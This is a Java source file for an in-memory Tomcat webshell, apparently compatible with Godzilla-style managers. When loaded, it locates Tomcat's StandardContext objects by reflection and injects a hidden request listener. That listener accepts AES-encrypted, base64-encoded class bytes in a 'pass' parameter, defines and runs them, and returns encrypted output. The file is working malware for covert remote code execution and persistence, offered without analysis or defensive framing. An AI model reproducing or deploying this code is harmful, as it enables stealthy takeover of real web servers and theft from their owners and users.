import java.io.PrintWriter;
import java.lang.reflect.*;
import java.util.*;

public class AesBase64TomcatListenerShell extends ClassLoader implements InvocationHandler{
    private static boolean initialized = false;
    private static final Object lock = new Object();
    private static Class payloadClass;
    String key = "3c6e0b8a9c15224a";
    String password = "pass";


    static {
        new AesBase64TomcatListenerShell();
    }

    public AesBase64TomcatListenerShell(ClassLoader loader){
        super(loader);
    }

    public AesBase64TomcatListenerShell(){
        synchronized (lock){
            if (!initialized){
                initialized = true;
                try {
                    Class servletRequestListenerClass = null;
                    try {
                        servletRequestListenerClass = loadClasses("jakarta.servlet.ServletRequestListener");
                    } catch (Exception e) {
                        try {
                            servletRequestListenerClass = loadClasses("javax.servlet.ServletRequestListener");
                        } catch (ClassNotFoundException ex) {

                        }
                    }
                    if (servletRequestListenerClass!=null){
                        addListener(Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(),new Class[]{servletRequestListenerClass},this));
                    }
                }catch (Throwable e){

                }
            }
        }
    }

    public Class loadClasses(String className) throws ClassNotFoundException {
        ArrayList<ClassLoader> classLoaders = new ArrayList<>();
        classLoaders.add(this.getClass().getClassLoader());
        try {
            classLoaders.add(Thread.currentThread().getContextClassLoader());
            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            int threadCount = threadGroup.activeCount();
            Thread[] threads = new Thread[threadCount];
            threadCount = threadGroup.enumerate(threads);
            for (int i = 0; i < threadCount; i++) {
                classLoaders.add(threads[i].getContextClassLoader());
            }
        }catch (Exception e){

        }
        int loaders = classLoaders.size();
        for (int i = 0; i < loaders; i++) {
            ClassLoader loader = classLoaders.get(i);
            if (loader!=null){
                try {
                   return Class.forName(className,true,loader);
                }catch(Throwable e){

                }
            }
        }
        return Class.forName(className);
    }


    public static Object[] getStandardContexts() throws Throwable {
        HashSet contexts = new HashSet();
        HashSet<String> blackType = new HashSet<String>();
        blackType.add(int.class.getName());
        blackType.add(short.class.getName());
        blackType.add(long.class.getName());
        blackType.add(double.class.getName());
        blackType.add(byte.class.getName());
        blackType.add(float.class.getName());
        blackType.add(char.class.getName());
        blackType.add(boolean.class.getName());
        blackType.add(Integer.class.getName());
        blackType.add(Short.class.getName());
        blackType.add(Long.class.getName());
        blackType.add(Double.class.getName());
        blackType.add(Byte.class.getName());
        blackType.add(Float.class.getName());
        blackType.add(Character.class.getName());
        blackType.add(Boolean.class.getName());
        blackType.add(String.class.getName());

        Object obj = searchObject("org.apache.catalina.core.StandardContext",Thread.currentThread(),new HashSet(),blackType,10,0);
        if (obj != null) {
            contexts.add(obj);
            try {
                Map contextMap = (Map) getFieldValue(getFieldValue(obj,"parent"),"children");
                contexts.addAll(contextMap.values());
            }catch (Exception e){

            }
        }
        return contexts.toArray();
    }
    public static Object searchObject(String targetClassName, Object object, HashSet<Integer> blacklist,HashSet<String> blackType,int maxDepth,int currentDepth)throws Throwable {
        currentDepth++;

        if (currentDepth >= maxDepth){
            return null;
        }

        if (object != null){

            if (targetClassName.equals(object.getClass().getName())){
                return object;
            }

            Integer hash = System.identityHashCode(object);
            if (!blacklist.contains(hash)) {
                blacklist.add(new Integer(hash));
                Field[] fields = null;
                ArrayList<Field> fieldsArray = new ArrayList();
                Class objClass = object.getClass();
                while (objClass != null){
                    Field[] fields1 = objClass.getDeclaredFields();
                    fieldsArray.addAll(Arrays.asList(fields1));
                    objClass = objClass.getSuperclass();
                }
                fields = fieldsArray.toArray(new Field[0]);


                for (int i = 0; i < fields.length; i++) {
                    Field field = fields[i];

                    try {
                        field.setAccessible(true);
                        Class fieldType = field.getType();
                        if (!blackType.contains(fieldType.getName())){
                            Object fieldValue = field.get(object);
                            if (fieldValue != null){
                                Object ret = null;
                                if (fieldType.isArray()){
                                    if (!blackType.contains(fieldType.getComponentType().getName())){
                                        int arraySize = Array.getLength(fieldValue);
                                        for (int j = 0; j < arraySize; j++) {
                                            ret = searchObject(targetClassName,Array.get(fieldValue,j),blacklist,blackType,maxDepth,currentDepth);
                                            if (ret!= null){
                                                break;
                                            }
                                        }
                                    }
                                }else{
                                    ret = searchObject(targetClassName,fieldValue,blacklist,blackType,maxDepth,currentDepth);
                                }
                                if (ret!= null){
                                    return ret;
                                }
                            }
                        }
                    }catch (Throwable e){

                    }
                }
            }
        }
        return null;

    }

    private boolean addListener(Object listener) throws Throwable {
        Object[] standardContexts = getStandardContexts();

        boolean isOk = false;

        for (int i = 0; i < standardContexts.length; i++) {
            Object standardContext = standardContexts[i];
            Object[] listenerObjects = null;
            try {
                listenerObjects = (Object[]) getFieldValue(standardContext,"applicationEventListenersObjects");
            }catch (Exception e) {

            }

            List listenerList = null;

            try {
                listenerList = (List) getFieldValue(standardContext,"applicationEventListenersList");
            }catch (Exception e){

            }


            if (listenerObjects!= null){
                Object[] newListenerObjects = new Object[listenerObjects.length + 1];
                System.arraycopy(listenerObjects,0, newListenerObjects,0,listenerObjects.length);
                newListenerObjects[newListenerObjects.length-1] = listener;
                getField(standardContext,"applicationEventListenersObjects").set(standardContext,newListenerObjects);
                isOk = true;
            }else if (listenerList!= null){
                listenerList.add(listener);
                isOk = true;
            }else {
                try {
                    Method addApplicationEventListenerMethod = standardContext.getClass().getDeclaredMethod("addApplicationEventListener",Object.class);
                    addApplicationEventListenerMethod.setAccessible(true);
                    addApplicationEventListenerMethod.invoke(standardContext,listener);
                    isOk = true;
                }catch (Exception e){

                }
            }

        }


        return isOk;
    }


    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if (method.getName().equals("requestInitialized")){
            Object servletRequestEvent = args[0];
            run(servletRequestEvent);
        }
        return null;
    }

    private Object invokeMethod(Object obj,String methodName,Object... parameters){
        try {
            ArrayList classes = new ArrayList();
            if (parameters!=null){
                for (int i=0;i<parameters.length;i++){
                    Object o1=parameters[i];
                    if (o1!=null){
                        classes.add(o1.getClass());
                    }else{
                        classes.add(null);
                    }
                }
            }
            Method method=getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[]{}));

            return method.invoke(obj, parameters);
        }catch (Exception e){
//        	e.printStackTrace();
        }
        return null;
    }

    private Method getMethodByClass(Class cs,String methodName,Class... parameters){
        Method method=null;
        while (cs!=null){
            try {
                method=cs.getMethod(methodName, parameters);
                cs=null;
            }catch (Exception e){
                cs=cs.getSuperclass();
            }
        }
        return method;
    }

    public static Field getField(Object obj, String fieldName){
        Class clazz = null;

        if(obj == null){
            return null;
        }

        if (obj instanceof Class){
            clazz = (Class)obj;
        }else {
            clazz = obj.getClass();
        }
        Field field = null;
        while (clazz!=null){
            try {
                field = clazz.getDeclaredField(fieldName);
                clazz = null;
            }catch (Exception e){
                clazz = clazz.getSuperclass();
            }
        }

        if (field != null){
            field.setAccessible(true);
        }

        return field;
    }
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f=null;
        if (obj instanceof Field){
            f=(Field)obj;
        }else {
            f = getField(obj, fieldName);
        }
        if (f != null) {
            return f.get(obj);
        }
        return null;
    }
    public String getParameter(Object requestObject,String name) {
        return (String) invokeMethod(requestObject, "getParameter", name);
    }
    public String getContentType(Object requestObject) {
        return (String) invokeMethod(requestObject, "getContentType");
    }


    public byte[] aes(byte[] s,boolean m){
        try{
            javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
            c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(key.getBytes(),"AES"));
            return c.doFinal(s);
        }catch (Exception e){
            return null;
        }
    }

    public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[] {
                    byte[].class
            }).invoke(Encoder, new Object[] {
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[] {
                        byte[].class
                }).invoke(Encoder, new Object[] {
                        bs
                });
            } catch (Exception e2) {}
        }
        return value;
    }
    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[] {
                    String.class
            }).invoke(decoder, new Object[] {
                    bs
            });
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[] {
                        String.class
                }).invoke(decoder, new Object[] {
                        bs
                });
            } catch (Exception e2) {}
        }
        return value;
    }

    private void run(Object servletRequestEvent)  {
        try {
            Object request = invokeMethod(servletRequestEvent,"getServletRequest");

            try {
                String contentType = getContentType(request);
                if (contentType!=null && contentType.contains("application/x-www-form-urlencoded")) {
                    String value = getParameter(request,password);
                    if (value!=null){
                        byte[] data = base64Decode(value);
                        data = aes(data, false);
                        if (data != null && data.length > 0){
                            if (payloadClass == null) {
                                ClassLoader loader = Thread.currentThread().getContextClassLoader();
                                if (loader == null) {
                                    loader = request.getClass().getClassLoader();
                                }

                                payloadClass =  new AesBase64TomcatListenerShell(loader).defineClass(data,0,data.length);
                            } else {
                                java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                                Object f = payloadClass.newInstance();
                                f.equals(arrOut);
                                f.equals(request);
                                f.equals(data);
                                f.toString();
                                String md5 = md5(password + key);
                                if (arrOut.size()>0) {
                                    Object response =  getFieldValue(getFieldValue(request,"request"),"response");
                                    PrintWriter printWriter = (PrintWriter) invokeMethod(response,"getWriter");
                                    printWriter.write(md5.substring(0, 16));
                                    printWriter.write(base64Encode(aes(arrOut.toByteArray(), true)));
                                    printWriter.write(md5.substring(16));
                                    printWriter.flush();
                                    printWriter.close();
                                }
                            }
                        }
                    }
                }

            }catch (Throwable ignored){
            }
        }catch (Throwable ignored){

        }
    }
}
